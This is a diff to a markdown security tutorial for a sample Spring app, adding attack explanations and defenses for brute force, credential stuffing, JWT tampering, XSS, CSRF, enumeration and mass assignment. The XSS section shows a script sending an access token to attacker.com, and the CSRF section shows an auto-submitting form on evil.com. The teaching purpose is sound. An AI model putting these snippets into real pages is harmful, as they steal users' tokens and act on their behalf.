@@ -2196,7 +2196,22 @@ After the OAuth flow, the rest of your system doesn't know or care how the user 
 
 ## Layer 4, Topic 11 — Common Attacks & Defenses
 
+#### Overview
+
+Auth is the front door of your system. It gets attacked more than anything else. This topic covers the attacks most relevant to miniAgoda — what they are, how they work, and exactly how to stop them.
+
 ### Attack 1 — Brute Force
+
+**How it works**
+Attacker systematically tries passwords against a known email:
+
+```
+POST /auth/login { email: "mario@gmail.com", password: "sunshine1"  } → 401
+POST /auth/login { email: "mario@gmail.com", password: "sunshine2"  } → 401
+POST /auth/login { email: "mario@gmail.com", password: "sunshine99" } → 200 ✓
+```
+
+Modern GPUs can try millions of combinations per second. Without rate limiting, a weak password falls in seconds.
 
 **Defense — Rate Limiting per IP + per Email**
 
@@ -2234,6 +2249,7 @@ public class LoginRateLimiter {
     }
 }
 ```
+Call it at the top of your login service — before any DB lookup:
 
 ```java
 // In AuthService
@@ -2241,8 +2257,10 @@ public AuthResponse login(LoginRequest request, String ip) {
     rateLimiter.checkAndIncrement(request.getEmail(), ip);
     // ... rest of login logic
 }
+```
+Extract client IP in the controller:
 
-// In AuthController
+```java
 @PostMapping("/login")
 public ResponseEntity<AuthResponse> login(
         @RequestBody LoginRequest request,
@@ -2262,7 +2280,28 @@ private String getClientIp(HttpServletRequest request) {
 
 ### Attack 2 — Credential Stuffing
 
-**Defense — Have I Been Pwned API (k-anonymity)**
+**How it works**
+Brute force tries random passwords. Credential stuffing is smarter — it uses real leaked credentials from other breached sites.
+
+```
+Attacker buys leaked DB:  mario@gmail.com : Sunshine99!
+Tries same combo on miniAgoda → works, because Mario reused password
+```
+
+Billions of leaked credentials are freely available. This attack is largely automated and hits at scale.
+
+**Defenses**
+
+**Rate limiting** (same as brute force) slows it down.
+**Anomaly detection** — flag suspicious patterns:
+
+```
+// Flag if: many accounts attempted from same IP
+// Flag if: same account attempted from many IPs simultaneously
+// Flag if: login from new country for this user
+```
+
+**Have I Been Pwned API** — check if submitted password appears in known breaches:
 
 ```java
 public boolean isPasswordPwned(String password) throws Exception {
@@ -2282,7 +2321,26 @@ Check at registration — reject passwords that appear in known breaches.
 
 ### Attack 3 — JWT Tampering
 
-**Sub-attack A — Algorithm Confusion (`alg:none`)**
+**How it works**
+Recall from Topic 3 — the payload is base64 encoded, not encrypted. An attacker decodes it, modifies it, re-encodes it:
+
+```
+Original:  { "userId": 42, "role": "GUEST" }
+Tampered:  { "userId": 42, "role": "ADMIN" }
+```
+
+The signature won't match — that's your protection. But there are two specific JWT attacks that bypass this.
+
+**Sub-attack A — Algorithm Confusion (alg:none)**
+Early JWT libraries accepted `"alg": "none"` — meaning no signature required. Attacker sets:
+
+```
+{ "alg": "none", "typ": "JWT" }
+```
+
+And submits a token with no signature. Vulnerable libraries accepted it.
+
+**Defense**
 
 ```java
 // Always explicitly specify allowed algorithms — modern JJWT rejects "none" by default
@@ -2296,11 +2354,46 @@ Never use outdated JWT libraries. JJWT 0.12+ is safe.
 
 **Sub-attack B — RS256 to HS256 Confusion**
 
-Always explicitly verify with the expected algorithm and key type. Modern libraries handle this, but understanding the attack matters.
+If your server uses RS256 (asymmetric), the public key is... public. An attacker can:
+
+```
+Take server's public key
+Use it as the HMAC secret for HS256
+Sign a tampered token with it
+Submit as HS256
+```
+
+A vulnerable server verifying with its public key would accept this.
+
+**Defense**: Always explicitly verify with the expected algorithm:
+
+```
+// In JwtUtil — never trust alg from the token header
+Jwts.parser()
+    .verifyWith(getSigningKey())      // for HS256
+    // or
+    .verifyWith(getRsaPublicKey())    // for RS256
+    .build()
+    .parseSignedClaims(token);
+```
+
+Modern libraries handle this, but it's worth understanding why.
 
 ### Attack 4 — Token Theft via XSS
 
+**How it works**
+Cross-Site Scripting (XSS) — attacker injects malicious JavaScript into your page. If the token is in localStorage, that script reads and exfiltrates it:
+
+```javascript
+// Injected malicious script
+fetch("https://attacker.com/steal?token=" + localStorage.getItem("accessToken"))
+```
+
+Token is now in the attacker's hands. They can impersonate the user from anywhere.
+
 **Defense — HttpOnly Cookies**
+
+A cookie with the `HttpOnly` **flag cannot be read by JavaScript** — not even by injected scripts:
 
 ```java
 @PostMapping("/login")
@@ -2333,7 +2426,23 @@ public ResponseEntity<Void> login(
 }
 ```
 
+XSS can still do damage (make API calls as the user) — but it can't steal the token and use it from elsewhere.
+
 ### Attack 5 — CSRF
+
+**How it works**
+Cross-Site Request Forgery. If your token is in a cookie, the browser automatically sends it — even on requests triggered by other sites:
+
+```
+User is logged into miniAgoda (cookie set)
+User visits evil.com
+evil.com contains:
+  <form action="https://miniagoda.com/bookings/77/cancel" method="POST">
+  <script>document.forms[0].submit()</script>
+
+Browser sends the request — with miniAgoda cookie attached automatically
+miniAgoda cancels booking 77
+```
 
 **Defense A — SameSite Cookie Flag**
 
@@ -2341,25 +2450,50 @@ public ResponseEntity<Void> login(
 .sameSite("Strict")  // cookie only sent on same-site requests
 ```
 
-**Defense B — CSRF Token**
+`Strict` — cookie never sent on cross-site requests. Stops CSRF entirely for modern browsers.
+`Lax` — cookie sent on top-level navigations (clicking a link) but not on cross-site POST. Good balance for most apps.
+
+**Defense B — CSRF Token (for older browser support)**
 
 ```java
+// Spring Security CSRF token — include in every state-changing request
 http.csrf(csrf -> csrf
     .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
+    // stores CSRF token in a readable cookie
+    // client must read it and send it back as a header
+    // attacker's site can't read cookies from miniAgoda's domain
 );
 ```
 
+For a pure JWT API with `SameSite=Strict` cookies — CSRF is largely mitigated. For maximum safety, use both.
+
 ### Attack 6 — Account Enumeration
 
-Always the same response, same timing, for login, register, and password reset:
+**How it works**
+Subtle information leaks reveal which accounts exist:
+
+```
+POST /auth/login { email: "mario@gmail.com", password: "wrong" }
+→ "Invalid password"           ← reveals email EXISTS
+
+POST /auth/login { email: "nobody@gmail.com", password: "wrong" }
+→ "No account found"           ← reveals email DOESN'T EXIST
+```
+
+Attacker builds a list of valid emails for targeted phishing or credential stuffing.
+
+**Defense — Uniform Responses**
+Already covered in Topic 4, but worth repeating as a named attack:
 
 ```java
+// Always same message, same timing
 return ResponseEntity
     .status(HttpStatus.UNAUTHORIZED)
     .body(new ErrorResponse("Invalid email or password"));
 ```
 
-Password reset:
+Same applies to password reset:
+
 ```
 ❌  "No account found with that email"
 ✓   "If that email is registered, you'll receive a reset link"
@@ -2367,7 +2501,23 @@ Password reset:
 
 ### Attack 7 — Mass Assignment
 
+**How it works**
+Attacker sends extra fields in a request body hoping they get mapped to sensitive model fields:
+
+```java
+POST /auth/register
+{
+  "email": "mario@gmail.com",
+  "password": "sunshine99",
+  "role": "ADMIN"              ← attacker adds this
+}
+```
+
+If your code maps the entire request body to a User object — attacker just made themselves an admin.
+
 **Defense — Explicit DTOs**
+
+Never map request bodies directly to your DB entity. Use a dedicated DTO:
 
 ```java
 // DTO — only contains what registration should accept
@@ -2396,6 +2546,15 @@ User user = User.builder()
 | CSRF | SameSite=Strict cookie flag |
 | Account enumeration | Uniform error messages and response timing |
 | Mass assignment | Explicit DTOs, never map request to entity directly |
+
+#### Summary
+
+* Brute force and credential stuffing — rate limit by both IP and email, Redis TTL handles cleanup
+* JWT attacks — use modern libraries, explicitly specify algorithm, never accept `alg:none`
+* XSS token theft — HttpOnly cookie makes token invisible to JavaScript
+* CSRF — SameSite=Strict stops cross-site requests from carrying your cookie
+* Enumeration — same message, same timing, always — for login, register, and password reset
+* Mass assignment — DTOs are not optional, they're a security boundary
 
 ---
 
